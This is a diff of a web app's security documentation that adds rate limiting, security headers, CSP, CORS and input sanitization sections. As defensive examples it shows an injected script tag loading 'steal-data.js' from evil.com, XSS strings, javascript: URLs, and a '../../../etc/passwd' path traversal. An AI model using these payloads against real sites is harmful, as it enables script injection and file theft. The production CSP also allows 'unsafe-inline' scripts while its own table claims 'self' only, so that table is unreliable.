@@ -151,64 +151,72 @@ if (
 
 ### 3. Rate Limiting
 
-**Implementation**: Application-level rate limiting (recommended for better-auth)
+**Implementation**: LRU cache-based sliding window rate limiter
+
+**Location**: `lib/security/rate-limit.ts`
+
+The rate limiter uses an LRU cache with sliding window algorithm, providing efficient memory usage and accurate request tracking without external dependencies (no Redis required for single-server deployment).
 
 ```typescript
 // lib/security/rate-limit.ts
-import { LRUCache } from 'lru-cache';
+import {
+  createRateLimiter,
+  authLimiter,
+  apiLimiter,
+  passwordResetLimiter,
+} from '@/lib/security/rate-limit';
 
-type RateLimitOptions = {
-  interval: number; // Time window in ms
-  uniqueTokenPerInterval: number; // Max unique IPs to track
-};
+// Pre-configured limiters (ready to use)
+const result = authLimiter.check('user-ip'); // 5 requests/minute
+const result = apiLimiter.check('user-ip'); // 100 requests/minute
+const result = passwordResetLimiter.check('user-ip'); // 3 requests/15 minutes
 
-export function rateLimit(options: RateLimitOptions) {
-  const tokenCache = new LRUCache({
-    max: options.uniqueTokenPerInterval,
-    ttl: options.interval,
-  });
-
-  return {
-    check: (limit: number, token: string): { success: boolean; remaining: number } => {
-      const tokenCount = (tokenCache.get(token) as number) || 0;
-
-      if (tokenCount >= limit) {
-        return { success: false, remaining: 0 };
-      }
-
-      tokenCache.set(token, tokenCount + 1);
-      return { success: true, remaining: limit - tokenCount - 1 };
-    },
-  };
-}
-
-// Usage in API routes
-const limiter = rateLimit({
-  interval: 60 * 1000, // 1 minute
-  uniqueTokenPerInterval: 500, // Max 500 unique IPs per minute
+// Custom limiter
+const customLimiter = createRateLimiter({
+  interval: 60000, // 1 minute window
+  maxRequests: 10, // Max requests per window
 });
 
+// Result includes rate limit info for headers
+const { success, limit, remaining, reset } = customLimiter.check('token');
+
+// Usage in API routes
 export async function POST(request: NextRequest) {
   const ip = request.ip ?? request.headers.get('x-forwarded-for') ?? '127.0.0.1';
-  const { success } = limiter.check(5, ip); // 5 requests per minute per IP
+  const result = authLimiter.check(ip);
 
-  if (!success) {
-    return Response.json(
-      { success: false, error: { message: 'Too many requests' } },
-      { status: 429 }
-    );
+  if (!result.success) {
+    return createRateLimitResponse(result); // Returns 429 with proper headers
   }
 
   // Process request
 }
 ```
 
-**Configuration by Endpoint**:
+**Pre-configured Limiters**:
 
-- Login: 5 attempts per minute per IP
-- Signup: 3 attempts per minute per IP
-- Password reset: 3 attempts per 15 minutes per IP
-- API endpoints: 100 requests per minute per authenticated user
+| Limiter                | Limit        | Window     | Use Case                |
+| ---------------------- | ------------ | ---------- | ----------------------- |
+| `authLimiter`          | 5 requests   | 1 minute   | Login, signup           |
+| `apiLimiter`           | 100 requests | 1 minute   | General API routes      |
+| `passwordResetLimiter` | 3 requests   | 15 minutes | Password reset requests |
+
+**Rate Limit Headers**:
+
+All rate-limited responses include standard headers:
+
+- `X-RateLimit-Limit` - Maximum requests allowed
+- `X-RateLimit-Remaining` - Requests remaining in window
+- `X-RateLimit-Reset` - Unix timestamp when limit resets
+- `Retry-After` - Seconds until retry (on 429 responses)
+
+**Features**:
+
+- **Sliding window**: Accurate tracking across time boundaries
+- **LRU eviction**: Automatic cleanup of old entries (max 500 unique tokens)
+- **Peek without consume**: Check limits without incrementing counter
+- **Manual reset**: Clear limits for specific tokens
+- **Thread-safe**: Concurrent request handling
 
 **Protection Against**:
 
@@ -317,152 +325,302 @@ export function proxy(request: NextRequest) {
 
 ### 6. Security Headers
 
-**Implementation via proxy** (Next.js 16):
+**Implementation**: Centralized security headers via `lib/security/headers.ts`
+
+All security headers are managed through the `setSecurityHeaders()` function, which is called in `proxy.ts` for every response.
 
 ```typescript
-// proxy.ts
-export function proxy(request: NextRequest) {
-  // ... authentication checks ...
+// lib/security/headers.ts
+import { setSecurityHeaders } from '@/lib/security/headers';
 
-  // Add security headers to all responses
-  const response = NextResponse.next();
-
-  // Prevent clickjacking
-  response.headers.set('X-Frame-Options', 'DENY');
-
-  // Prevent MIME type sniffing
-  response.headers.set('X-Content-Type-Options', 'nosniff');
-
-  // Enable XSS filter (legacy browsers)
-  response.headers.set('X-XSS-Protection', '1; mode=block');
-
-  // Control referrer information
-  response.headers.set('Referrer-Policy', 'strict-origin-when-cross-origin');
-
-  // Permissions policy - disable unnecessary features
-  response.headers.set('Permissions-Policy', 'geolocation=(), microphone=(), camera=()');
-
-  // Force HTTPS in production
-  if (process.env.NODE_ENV === 'production') {
-    response.headers.set('Strict-Transport-Security', 'max-age=31536000; includeSubDomains');
-  }
-
-  return response;
-}
+// In proxy.ts
+const response = NextResponse.next();
+setSecurityHeaders(response);
 ```
 
-**Note**: Content-Security-Policy is intentionally omitted from the current implementation to avoid conflicts with Next.js development tools. See "Content Security Policy (CSP)" section below for implementation guidance.
+**Headers Applied**:
+
+| Header                      | Value                                                   | Purpose                       |
+| --------------------------- | ------------------------------------------------------- | ----------------------------- |
+| `Content-Security-Policy`   | Environment-specific (see CSP section)                  | XSS prevention                |
+| `X-Frame-Options`           | `SAMEORIGIN`                                            | Clickjacking prevention       |
+| `X-Content-Type-Options`    | `nosniff`                                               | MIME type sniffing prevention |
+| `Referrer-Policy`           | `strict-origin-when-cross-origin`                       | Referrer leakage control      |
+| `Permissions-Policy`        | `geolocation=(), microphone=(), camera=()`              | Feature restriction           |
+| `Strict-Transport-Security` | `max-age=31536000; includeSubDomains` (production only) | HTTPS enforcement             |
+
+**Deprecated Headers Removed**:
+
+- ❌ `X-XSS-Protection` - Deprecated, replaced by CSP. Can cause XSS vulnerabilities in older browsers.
+
+**Header Changes from Previous Versions**:
+
+- `X-Frame-Options`: Changed from `DENY` to `SAMEORIGIN` to allow same-origin framing (useful for embedded content)
+- `Content-Security-Policy`: Now implemented with environment-specific policies
 
 ### 7. Content Security Policy (CSP)
 
-**Status**: Not yet implemented
+**Status**: ✅ Implemented
 
-**What is CSP?**
-Content-Security-Policy is a security header that tells browsers what resources (scripts, styles, images, etc.) are allowed to load and execute. It's the **most effective defense against XSS attacks**.
+**Location**: `lib/security/headers.ts`
 
-**Why Next.js Development Mode Conflicts with Strict CSP:**
-Next.js development features that violate strict CSP:
+Content-Security-Policy is implemented with environment-specific policies to balance security with development experience.
 
-- **Hot Module Replacement (HMR)**: Uses `eval()` requiring `'unsafe-eval'`
-- **Inline Scripts**: Next.js injects inline scripts for hydration requiring `'unsafe-inline'`
-- **Dynamic Style Injection**: Fast Refresh injects inline styles requiring `'unsafe-inline'`
-
-**Solution: Environment-Specific Policies**
-Use different CSP policies for development and production:
+**Implementation**:
 
 ```typescript
-// proxy.ts
-export function proxy(request: NextRequest) {
-  // ... other code ...
+// lib/security/headers.ts
+import { getCSP, getCSPConfig, extendCSP, buildCSP } from '@/lib/security/headers';
 
-  const response = NextResponse.next();
+// Get CSP string for current environment
+const csp = getCSP();
 
-  // Environment-specific CSP
-  const csp =
-    process.env.NODE_ENV === 'production'
-      ? // Production: Strict policy
-        "default-src 'self'; " +
-        "script-src 'self'; " +
-        "style-src 'self'; " +
-        "img-src 'self' data: https:; " +
-        "font-src 'self' data:; " +
-        "connect-src 'self'; " +
-        "frame-ancestors 'none';"
-      : // Development: Permissive policy for Next.js
-        "default-src 'self'; " +
-        "script-src 'self' 'unsafe-eval' 'unsafe-inline'; " +
-        "style-src 'self' 'unsafe-inline'; " +
-        "img-src 'self' data: https:; " +
-        "font-src 'self' data:; " +
-        "connect-src 'self' webpack://*;";
+// Get raw CSP config object
+const config = getCSPConfig();
 
-  response.headers.set('Content-Security-Policy', csp);
+// Extend base CSP with additional directives
+const extendedCSP = extendCSP({
+  'img-src': ['https://cdn.example.com'],
+  'connect-src': ['https://api.analytics.com'],
+});
+```
 
-  // ... other headers ...
-  return response;
-}
+**Development CSP** (permissive for HMR/Fast Refresh):
+
+```
+default-src 'self';
+script-src 'self' 'unsafe-eval' 'unsafe-inline';
+style-src 'self' 'unsafe-inline';
+img-src 'self' data: https:;
+font-src 'self' data:;
+connect-src 'self' ws://localhost:*;
+frame-ancestors 'self';
+form-action 'self';
+base-uri 'self';
+object-src 'none';
+```
+
+**Production CSP** (strict):
+
+```
+default-src 'self';
+script-src 'self' 'unsafe-inline';
+style-src 'self' 'unsafe-inline';
+img-src 'self' data: https:;
+font-src 'self' data:;
+connect-src 'self';
+frame-ancestors 'self';
+form-action 'self';
+base-uri 'self';
+object-src 'none';
+report-uri /api/csp-report;
 ```
 
 **CSP Directives Explained:**
 
-- `default-src 'self'` - Only load resources from same origin by default
-- `script-src 'self'` - Only execute scripts from same origin (blocks injected scripts)
-- `'unsafe-eval'` - Allows `eval()` (dev only, for HMR)
-- `'unsafe-inline'` - Allows inline scripts/styles (dev only, for Fast Refresh)
-- `img-src 'self' data: https:` - Allow same-origin, data URIs, and any HTTPS images
-- `frame-ancestors 'none'` - Prevent iframe embedding (replaces X-Frame-Options)
+| Directive         | Value                    | Purpose                              |
+| ----------------- | ------------------------ | ------------------------------------ |
+| `default-src`     | `'self'`                 | Fallback for unspecified directives  |
+| `script-src`      | `'self'`                 | Only same-origin scripts             |
+| `style-src`       | `'self' 'unsafe-inline'` | Same-origin + Tailwind inline styles |
+| `img-src`         | `'self' data: https:`    | Same-origin, data URIs, HTTPS images |
+| `font-src`        | `'self' data:`           | Same-origin and data URI fonts       |
+| `connect-src`     | `'self'`                 | XHR/fetch/WebSocket connections      |
+| `frame-ancestors` | `'self'`                 | Embedding control (clickjacking)     |
+| `object-src`      | `'none'`                 | Block plugins (Flash, Java)          |
 
-**Attack Prevention Example:**
+**CSP Violation Reporting**:
+
+Production CSP includes `report-uri /api/csp-report` which logs violations:
+
+```typescript
+// app/api/csp-report/route.ts
+export async function POST(request: Request) {
+  const report = await request.json();
+  logger.warn('CSP Violation', { report });
+  return new Response(null, { status: 204 });
+}
+```
+
+**Extending CSP for External Services**:
+
+```typescript
+// For routes needing additional CSP sources
+const analyticsCSP = extendCSP({
+  'connect-src': ['https://api.analytics.com'],
+  'script-src': ['https://cdn.analytics.com'],
+});
+```
+
+**Attack Prevention:**
 
 ```html
 <!-- Without CSP: This injected script runs -->
 <script src="https://evil.com/steal-data.js"></script>
 
-<!-- With CSP: Browser blocks it because evil.com is not in script-src -->
+<!-- With CSP: Browser blocks it -->
 <!-- Console error: "Refused to load script from 'https://evil.com/...' because it violates CSP" -->
 ```
 
-**Advanced: Nonce-based CSP** (Most Secure):
-Instead of `'unsafe-inline'`, use nonces for inline scripts:
+### 8. CORS Configuration
 
-```typescript
-// Generate unique nonce per request
-const nonce = crypto.randomBytes(16).toString('base64');
+**Implementation**: Configurable CORS via `lib/security/cors.ts`
 
-const csp = `script-src 'self' 'nonce-${nonce}'; style-src 'self' 'nonce-${nonce}'`;
+CORS (Cross-Origin Resource Sharing) is configured to be secure by default while allowing external access when explicitly configured.
 
-// Pass nonce to Next.js pages for inline scripts
-// <script nonce={nonce}>...</script>
+**Default Behavior**:
+
+- **Production**: Same-origin only (no CORS headers) unless `ALLOWED_ORIGINS` is set
+- **Development**: Automatically allows localhost variants (3000, 3001, 127.0.0.1)
+
+**Configuration**:
+
+```bash
+# .env - Leave unset for same-origin only (most secure)
+# Set to enable CORS for specific domains:
+ALLOWED_ORIGINS=https://app.example.com,https://mobile.example.com
 ```
 
-**Why CSP is Critical:**
-
-- **XSS Defense**: Primary protection against cross-site scripting
-- **Data Injection Prevention**: Blocks unauthorized resource loading
-- **Clickjacking Protection**: `frame-ancestors` directive replaces X-Frame-Options
-- **Modern Standard**: Recommended by OWASP, required for high-security applications
-
-**CSP Reporting** (Optional):
-Monitor CSP violations in production:
+**Usage in API Routes**:
 
 ```typescript
-const csp =
-  "default-src 'self'; " +
-  "script-src 'self'; " +
-  'report-uri /api/csp-report; ' +
-  'report-to csp-endpoint';
+// Option 1: HOC wrapper for handlers
+import { withCORS, handlePreflight } from '@/lib/security/cors';
 
-// Create endpoint to receive reports
-// app/api/csp-report/route.ts
-export async function POST(request: Request) {
-  const report = await request.json();
-  // Log or store CSP violations
-  console.warn('CSP Violation:', report);
-  return new Response(null, { status: 204 });
+export async function OPTIONS(request: NextRequest) {
+  return handlePreflight(request);
 }
+
+export const POST = withCORS(async (request: NextRequest) => {
+  return Response.json({ data: 'example' });
+});
+
+// Option 2: Create all handlers at once
+import { createCORSHandlers } from '@/lib/security/cors';
+
+const handlers = createCORSHandlers({
+  GET: async (request) => Response.json({ data: 'example' }),
+  POST: async (request) => Response.json({ created: true }),
+});
+
+export const { GET, POST, OPTIONS } = handlers;
 ```
 
-### 8. Password Reset Security
+**Custom CORS Options**:
+
+```typescript
+const customOptions: CORSOptions = {
+  origin: ['https://specific.com'],
+  methods: ['GET', 'POST'],
+  credentials: true,
+  maxAge: 86400, // 24 hours preflight cache
+  allowedHeaders: ['Content-Type', 'Authorization'],
+  exposedHeaders: ['X-Request-ID'],
+};
+
+export const POST = withCORS(handler, customOptions);
+```
+
+**Security Features**:
+
+- **Origin Validation**: Strict comparison, case-sensitive
+- **Fail-Secure**: No origin = deny (null origins rejected)
+- **Credentials Support**: Proper handling for cookies/auth headers
+- **Vary Header**: Prevents caching issues with different origins
+
+### 9. Input Sanitization
+
+**Implementation**: XSS prevention utilities in `lib/security/sanitize.ts`
+
+Input sanitization provides defense-in-depth against XSS attacks, complementing CSP headers.
+
+**Available Functions**:
+
+```typescript
+import {
+  escapeHtml,
+  stripHtml,
+  sanitizeUrl,
+  sanitizeRedirectUrl,
+  sanitizeObject,
+  sanitizeFilename,
+} from '@/lib/security/sanitize';
+```
+
+**HTML Escaping** (for displaying user content):
+
+```typescript
+const userInput = '<script>alert("xss")</script>';
+const safe = escapeHtml(userInput);
+// Result: '&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;'
+```
+
+**HTML Stripping** (for plain text extraction):
+
+```typescript
+const html = '<p>Hello <strong>World</strong></p>';
+const text = stripHtml(html);
+// Result: 'Hello World'
+```
+
+**URL Sanitization** (blocks dangerous protocols):
+
+```typescript
+sanitizeUrl('javascript:alert(1)'); // Returns ''
+sanitizeUrl('data:text/html,...'); // Returns ''
+sanitizeUrl('https://example.com'); // Returns 'https://example.com'
+sanitizeUrl('/relative/path'); // Returns '/relative/path'
+```
+
+**Redirect URL Sanitization** (prevents open redirects):
+
+```typescript
+const baseUrl = 'https://app.example.com';
+
+sanitizeRedirectUrl('/dashboard', baseUrl); // '/dashboard'
+sanitizeRedirectUrl('https://evil.com', baseUrl); // '/'
+sanitizeRedirectUrl('//evil.com', baseUrl); // '/'
+
+// With allowed hosts
+const allowedHosts = ['docs.example.com'];
+sanitizeRedirectUrl('https://docs.example.com/guide', baseUrl, allowedHosts);
+// Returns 'https://docs.example.com/guide'
+```
+
+**Object Sanitization** (recursive):
+
+```typescript
+const input = {
+  name: '<script>xss</script>',
+  profile: {
+    bio: '<img onerror=alert(1)>',
+  },
+};
+
+const clean = sanitizeObject(input);
+// All string values HTML-escaped recursively
+```
+
+**Filename Sanitization** (prevents path traversal):
+
+```typescript
+sanitizeFilename('../../../etc/passwd'); // 'etc_passwd'
+sanitizeFilename('file\0.txt'); // 'file.txt'
+sanitizeFilename('folder/file.txt'); // 'folder_file.txt'
+```
+
+**When to Use**:
+
+| Scenario                     | Function                |
+| ---------------------------- | ----------------------- |
+| Displaying user text in HTML | `escapeHtml()`          |
+| Plain text from HTML input   | `stripHtml()`           |
+| User-provided URLs           | `sanitizeUrl()`         |
+| Post-login redirects         | `sanitizeRedirectUrl()` |
+| File upload names            | `sanitizeFilename()`    |
+| API input (defensive)        | `sanitizeObject()`      |
+
+### 10. Password Reset Security
 
 **Token Generation**:
 
@@ -506,7 +664,7 @@ export async function POST(request: Request) {
 - Token replay (single use via verification table)
 - Brute force (rate limited to 3 attempts per 15 minutes)
 
-### 8. OAuth Security
+### 11. OAuth Security
 
 **State Parameter Validation**:
 better-auth automatically generates and validates state parameters to prevent CSRF in OAuth flows.
@@ -652,17 +810,20 @@ npm audit fix --force
 ### Security Checklist
 
 - [x] All passwords hashed with scrypt (better-auth default)
-- [ ] BETTER_AUTH_SECRET is 32+ characters
+- [ ] BETTER_AUTH_SECRET is 32+ characters (verify in production)
 - [x] Session cookies are httpOnly, secure, sameSite
-- [ ] Rate limiting on auth endpoints
-- [x] Input validation on all user inputs
-- [x] CSRF protection enabled (better-auth built-in)
-- [ ] Security headers set in middleware
-- [ ] HTTPS enforced in production
+- [x] Rate limiting on auth endpoints (`authLimiter` in lib/security/rate-limit.ts)
+- [x] Input validation on all user inputs (Zod schemas)
+- [x] Input sanitization utilities (lib/security/sanitize.ts)
+- [x] CSRF protection enabled (better-auth built-in + origin validation in proxy.ts)
+- [x] Security headers set in proxy (lib/security/headers.ts)
+- [x] Content-Security-Policy with environment-specific policies
+- [x] CORS configuration (lib/security/cors.ts)
+- [x] HTTPS enforced in production (HSTS header)
 - [x] OAuth redirect URLs validated (better-auth built-in)
 - [x] Sensitive errors don't leak information
 - [x] Database uses connection pooling with limits
-- [ ] Regular dependency updates
+- [ ] Regular dependency updates (schedule npm audit)
 
 ## Incident Response
 
